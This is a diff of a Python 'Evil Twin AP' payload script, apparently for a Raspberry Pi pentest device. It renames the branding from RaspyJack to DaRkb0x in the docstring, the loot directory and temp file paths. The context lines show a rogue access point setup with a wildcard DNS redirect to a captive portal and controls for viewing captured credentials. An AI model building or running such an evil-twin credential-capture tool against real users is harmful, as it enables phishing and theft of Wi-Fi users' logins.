@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-RaspyJack Payload -- Evil Twin AP
+DaRkb0x Payload -- Evil Twin AP
 ==================================
 Author: 7h30th3r0n3
 
@@ -30,7 +30,7 @@ Controls:
   KEY2      -- Show captured credentials
   KEY3      -- Exit + full cleanup
 
-Loot: /root/Raspyjack/loot/EvilTwin/
+Loot: /root/DaRkb0x/loot/EvilTwin/
 """
 
 import os
@@ -70,11 +70,11 @@ font = scaled_font()
 # ---------------------------------------------------------------------------
 # Constants
 # ---------------------------------------------------------------------------
-LOOT_DIR = "/root/Raspyjack/loot/EvilTwin"
+LOOT_DIR = "/root/DaRkb0x/loot/EvilTwin"
 os.makedirs(LOOT_DIR, exist_ok=True)
 
-HOSTAPD_CONF = "/tmp/raspyjack_evil_twin_hostapd.conf"
-DNSMASQ_CONF = "/tmp/raspyjack_evil_twin_dnsmasq.conf"
+HOSTAPD_CONF = "/tmp/darkbox_evil_twin_hostapd.conf"
+DNSMASQ_CONF = "/tmp/darkbox_evil_twin_dnsmasq.conf"
 PORTAL_PORT = 80
 GATEWAY_IP = "10.0.66.1"
 DHCP_RANGE_START = "10.0.66.10"
@@ -260,7 +260,7 @@ def _write_dnsmasq_conf(iface):
         f"address=/#/{GATEWAY_IP}\n"
         f"no-resolv\n"
         f"log-queries\n"
-        f"log-facility=/tmp/raspyjack_evil_twin_dns.log\n"
+        f"log-facility=/tmp/darkbox_evil_twin_dns.log\n"
     )
     with open(DNSMASQ_CONF, "w") as f:
         f.write(conf)
